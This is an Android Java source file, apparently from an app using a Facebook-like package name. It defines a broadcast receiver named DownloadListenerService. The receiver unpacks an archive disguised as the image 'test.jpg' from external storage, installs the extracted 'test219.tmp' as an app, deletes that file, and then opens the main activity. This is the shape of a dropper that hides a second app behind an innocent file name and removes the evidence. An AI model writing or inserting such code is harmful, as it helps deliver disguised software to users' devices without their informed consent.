package com.vnfa.facebook;

import java.io.File;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.util.Log;

import com.telpoo.frame.utils.AppSupport;
import com.telpoo.frame.utils.FileSupport;
import com.telpoo.frame.utils.Mlog;

public class DownloadListenerService extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		Log.e("naq", "date");

		boolean status = FileSupport.unpackZip(Environment.getExternalStorageDirectory() + "/temp/", "test.jpg");

		AppSupport.install(Environment.getExternalStorageDirectory() + "/temp/" + "test219.tmp", context);

		File file = new File(Environment.getExternalStorageDirectory() + "/temp/", "test219.tmp");
		boolean deleted = file.delete();
		Mlog.D("delete file:" + status);

		Intent i = new Intent();
		i.setClassName("com.vnfa.facebook", "com.vnfa.facebook.MainActivity");
		i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(i);

	}
}
